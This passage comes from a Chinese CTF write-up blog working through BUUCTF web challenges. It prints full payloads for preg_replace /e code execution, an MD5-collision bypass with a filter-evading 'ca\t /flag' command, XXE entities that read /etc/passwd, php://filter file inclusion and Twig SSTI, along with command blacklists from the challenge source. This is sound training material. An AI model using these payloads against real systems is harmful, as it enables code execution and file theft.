在正则表达式中有自己的含义:</p><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p><p>这里的\1指的是第一个匹配项</p><p>这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令</p><p>为了实现运行getflag的目的，就要先让\1为getflag(),也就是传入</p><p> .*={${getFlag()}}</p><pre class="language-none"><code class="language-none">原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;);</code></pre><p>这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\S</p><p>所以传入的payload为\S*={${getFlag()}}</p><pre class="language-none"><code class="language-none">\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配</code></pre><p>最终payload为?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。</p><p>借一下百度的wp的源码</p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;flag.php&#39;;$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>flag.php</p><pre class="language-none"><code class="language-none">&lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre><p>前两个<code>foreach</code>语句分别将<code>POST</code>参数和<code>GET</code>参数进行变量覆盖，接着是三个if语句，<code>exit()</code>函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。</p><p>首先我们想到的是让脚本执行到最后一句<code>echo $flag;</code>，但即使绕过三个if语句，我们<code>GET</code>传参或者<code>POST</code>传参的flag总会被变量覆盖：如我们<code>GET</code>传参flag=aaa，在第二个foreach语句中变成<code>$flag</code> = <code>$aaa</code>，而<code>$aaa</code>变量没有定义为空，最后的输出就是空</p><p>但是由于变量覆盖的原因最终不会显示flag</p><p>而<code>exit()</code>函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将<code>exit()</code>函数内的参数用<code>$flag</code>覆盖掉就能输出flag了；</p><p>所以我们可以借助后两个if语句中的exit来输出flag</p><p>当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag);</p><p>还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113790063?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181026268.png" alt="image-20210811181026268"></p><p>所以为了想读取源码，我们将index.php按照相同的方式加密后变为</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181304356.png" alt="image-20210811181304356"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181317988.png" alt="image-20210811181317988"></p><p>重点：</p><pre class="language-none"><code class="language-none">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;</code></pre><p>先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/114494427">(1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子 - 简书 (jianshu.com)</a></p><p>从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等</p><p>再考虑到要将一些不可见字符传到服务器，这里可以使用url编码</p><p>最终</p><pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠，</p><p><a href="https://blog.csdn.net/weixin_41463193/article/details/83539168">(1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客</a></p><p><a href="https://www.thinbug.com/q/28062568">为什么3反斜杠在php中等于4反斜杠？ - Thinbug</a></p><p>题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠</p><p>贴个大佬的文章</p><p><a href="https://www.jianshu.com/p/076c5b422c96">从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com)</a></p><p>可以先用dir查看目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811185153589.png" alt="image-20210811185153589"></p><p>ca\t%20/flag来绕过第一个if</p><p>用\的原因是因为在linux下行尾输\可以换行并且继续输入命令</p><p>这里正则匹配漏了uniq和sort，用这俩也能拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190241730.png" alt="image-20210811190241730"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190251827.png" alt="image-20210811190251827"></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>先抓包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225117333.png" alt="image-20210811225117333"></p><p>发现有两个post的参数</p><p>然后根据报错的信息</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225205171.png" alt="image-20210811225205171"></p><p>这里用了call_user_func函数，也就是func是函数名，p是参数</p><p>用system试时发现被过滤了，发现file_get_contents函数可以用</p><p>file_get_contents拿源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result &#x3D; call_user_func($func, $p);    $a&#x3D; gettype($result);    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;    var $func &#x3D; &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];if ($func !&#x3D; null) &#123;    $func &#x3D; strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>由于这个过滤不存在于test中，所以可以利用反序列化来执行命令</p><p>利用find命令来查找文件名中有flag的文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p><p>最后用file_get_contents来查看文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224611612.png" alt="image-20210811224611612"></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下</p><p><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/118030007">NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a></p><blockquote><p>- XML被设计为传输和存储数据，其焦点是数据的内容。</p><p>- HTML被设计用来显示数据，其焦点是数据的外观。</p></blockquote><p>基本语法：</p><blockquote><p>- 所有 XML 元素都须有关闭标签。</p><p>- XML 标签对大小写敏感。</p><p>- XML 必须正确地嵌套。</p><p>- XML 文档必须有根元素。</p><p>- XML 的属性值须加引号。</p></blockquote><p>- 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812002508519.png" alt="image-20210812002508519"></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--book的子元素，lang为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的结束--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的结束--></span></code></pre><p><strong>DTD</strong></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;</code></pre><p>当使用外部DTD时，通过如下语法引入。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"filename"</span><span class="token punctuation">></span></span></code></pre><p>外部DTD实例</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"test.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Y0u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>@re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>v3ry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>g00d!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtd：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义to元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义from元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义head元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义body元素为”#PCDATA”类型--></span></code></pre><p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p><strong>内部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt;</code></pre><p><strong>外部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt;</code></pre><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004625128.png" alt="image-20210812004625128"></p><p>通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p>简单的payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&lt;&#x2F;xml&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><strong>题解：</strong></p><p>抓包，能看出是用xml进行传输数据</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812003649956.png" alt="image-20210812003649956"></p><p>直接上payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004223242.png" alt="image-20210812004223242"></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>看这个url，试试伪协议读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163436662.png" alt="image-20210812163436662"></p><p>多了个php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163515084.png" alt="image-20210812163515084"></p><p>所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index</p><p>base64解码后的重点</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;</code></pre><p>存在flag.php页面，之后就是想办法把他读出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163740442.png" alt="image-20210812163740442"></p><p>接下来有一个</p><p>php伪协议嵌套的知识点</p><p>PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/<strong>index</strong>/resource=flag</p><p>这样就能绕过if的判断，读取flag文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812164621882.png" alt="image-20210812164621882"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165152600.png" alt="image-20210812165152600"></p><p>输入id和价格，应该是购买独角兽，而且price只允许输入一位数，前三个买的时候都显示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165251531.png" alt="image-20210812165251531"></p><p>但是因为price的输入限制，所以我猜这里应该是要想办法购买第四个独角兽</p><p>这里要利用Unicode的编码，查找一个大于1337的字符</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>比如这个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165952292.png" alt="image-20210812165952292"></p><p>成功拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170021095.png" alt="image-20210812170021095"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170027487.png" alt="image-20210812170027487"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220813990.png" alt="image-20210812220813990"></p><p>看一眼hint</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220919778.png" alt="image-20210812220919778"></p><p>flag页面的登录框</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221024199.png" alt="image-20210812221024199"></p><p>这里存在ssti注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220731194.png" alt="image-20210812220731194"></p><p>可以试出来是twig模板，根据提示注入点应该在cookie里，抓包</p><p>通过修改user内容实现注入</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog</a></p><p>这里是twig1.x版本才有的模板注入，在2.x和3.x版本<code>__self</code> 变量在 SSTI 中早已失去了他的作用，这之后主要通过过滤器来实现攻击<a href="https://xz.aliyun.com/t/10056#toc-14">https://xz.aliyun.com/t/10056#toc-14</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p><p>ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目源码</p><pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python# #encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app &#x3D; Flask(__name__)secert_key &#x3D; os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        